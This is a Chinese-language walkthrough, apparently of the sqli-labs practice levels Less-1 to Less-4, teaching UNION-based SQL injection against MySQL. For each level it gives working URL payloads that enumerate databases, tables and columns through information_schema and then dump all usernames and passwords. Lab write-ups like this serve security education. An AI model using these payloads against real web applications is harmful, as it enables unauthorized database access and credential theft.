在mysql中有一个系统数据库`information_schema`存储着所有的数据库的相关信息

查询数据库名

`select schema_name from information_schema.schemata`

查询数据表

`select table_name from information_schema.tables where table_schema='xxx'`

查询列

`select column_name from information_schema.columns where table_name='xxx'`

## Basic Challenges

### Less-1

传入`?id=1'`得到报错`''1'' LIMIT 0,1'`,说明原本的sql语句为`'$id' LIMIT 0,1`,但是此时`$id`多了一个`'`造成了`'`没有完全匹配,利用注释将后面多余的`'`去除

传入`?id=1'-- `此时的sql语句变为`'1'-- LIMIT 0,1`此时后面的`LIMIT 0,1`已经被注释掉了,同时`'`已经完全匹配所以sql语句正确执行

使用`order by`进行排序,`?id=1' order by 4-- `当传入4时报错`Unknown column '4' in 'order clause'`说明只有3列数据

利用`group_concat`列出所有数据库名

`?id=-1' UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata-- `

![image-20210418202649296](image-20210418202649296.png)

列出表名`?id=-1' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'-- `

![image-20210418202947478](image-20210418202947478.png)

查询列`?id=-1' UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- `

![image-20210418203352912](image-20210418203352912.png)

列出所有数据`?id=-1' UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users-- `

![image-20210418204548460](image-20210418204548460.png)

### Less-2

传入`?id=1'`报错`'' LIMIT 0,1'`,传入`?id='1`报错`''1 LIMIT 0,1'`,推测sql语句为`$id LIMIT 0,1`(没有`'`)

爆破库名`?id=-1 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata-- `

爆破表名`?id=-1 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'-- `

查询列`?id=-1 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- `

列出所有数据`?id=-1 UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users-- `

### Less-3

传入`?id=1'`报错`''1'') LIMIT 0,1'`,推测sql语句为`('$id') LIMIT 0,1`

爆破库名`?id=-1') UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata-- `

爆破表名`?id=-1') UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'-- `

查询列`?id=-1') UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- `

列出所有数据`?id=-1') UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users-- `

### Less-4

传入`?id=1'`无回显,传入`?id-1"`报错`"1"") LIMIT 0,1`,推测sql语句为`("$id") LIMIT 0,1`

爆破库名`?id=-1") UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata-- `

爆破表名`?id=-1") UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'-- `

查询列`?id=-1") UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- `

列出所有数据`?id=-1") UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users-- `